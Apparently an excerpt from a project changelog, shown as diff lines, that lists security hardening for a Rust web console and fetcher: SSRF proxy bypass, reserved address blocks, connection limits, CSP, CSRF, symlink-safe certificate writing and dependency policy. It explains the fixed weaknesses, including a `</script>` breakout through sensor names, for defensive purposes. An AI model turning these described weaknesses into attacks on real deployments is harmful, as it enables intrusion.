+  to the same pinned address, and labels every captured body `verified`, `unverified` (with the
+  validation error), `plaintext` or `unknown` (migration `0007`); the samples page shows the label.
+  Cost: a TLS 1.2 server that can sign its handshake only with SHA-1 is no longer captured.
+  Plain-http hops build no certificate verifier, so they neither load the system trust store
+  nor fail on a host without one.
+- **The fetcher ignores proxy settings in its environment** - reqwest reads `HTTP_PROXY`,
+  `HTTPS_PROXY` and `ALL_PROXY` by default, and a proxy resolves and dials the host itself, so a
+  fetch would have bypassed the address the SSRF guard vetted.
+- **Every special-purpose address block is kept out of the feed** - the reserved list gains the
+  IANA special-purpose blocks it lacked (carrier-grade NAT `100.64.0.0/10` among them), and an IPv6
+  address that embeds an IPv4 host (mapped, NAT64 `64:ff9b::/96`, 6to4) is judged by that host.
+  Such addresses are never published, reported or dialed. Existing rows are not rewritten: the next
+  feed build drops them, an approved queue row for one is held as reserved and warns on every
+  poll, and a fetch row resolving into one is rejected on its next attempt.
+- **The console bounds what one client can hold** - `axum::serve` armed no header timeout and
+  capped nothing, so slow or idle connections could be held indefinitely. The console now runs its
+  own HTTP/1.1 accept loop (64 connections, 10 s for headers, 10 s and 2 MiB for a body), checks
+  passwords in two bounded slots so a login flood cannot take the CPU, and limits login attempts
+  to 30 a minute across all addresses as well as 5 per address. `propolis_console_*` metrics count
+  what was refused.
+- **A Content-Security-Policy on every page** - scripts and styles are served as files, templates
+  carry no inline script, style or event handler, and every response carries a policy that allows
+  script and style only from the console itself. The error pages the console builds without a
+  template follow it too, and Relist, Delist and Delete, which used to confirm through an inline
+  handler, render disabled until the script that asks for confirmation has loaded.
+- **Chart data cannot end its script element** - the dashboard's protocol chart labels are
+  sensor names, which intake takes as any non-empty string and a split deployment receives from
+  its collectors. Placed raw in the chart's JSON data element, a name holding `</script>` ended
+  the element and put the rest into the operator's page as markup (before the policy, as script).
+  Chart data now escapes `<`, `>` and `&` as JSON unicode escapes.
+- **Chain verification needs a CSRF token** - `POST /integrity/verify` reads the whole ledger but
+  took no token; it now requires one like every other console POST, and a second run while one is
+  in progress answers 409.
+- **Certificates are written without following links** - `provision-certs` wrote each PEM and
+  tightened key modes afterwards, following any link already at the target and joining the
+  collector id into the path unchecked. Files are now created new with their final mode, and a
+  collector id that is not a plain name is refused.
+- **Dependency policy** - `event-listener` 5.4.2 (RUSTSEC-2026-0221), two yanked crates replaced,
+  unused and unmaintained crates removed. `deny.toml` fails CI on a vulnerable, unsound,
+  unmaintained or yanked crate, a licence outside the allowlist, or an unknown registry or git
+  source, with one reviewed exception (RUSTSEC-2023-0071 in `rsa`, reachable only from a test
+  client).
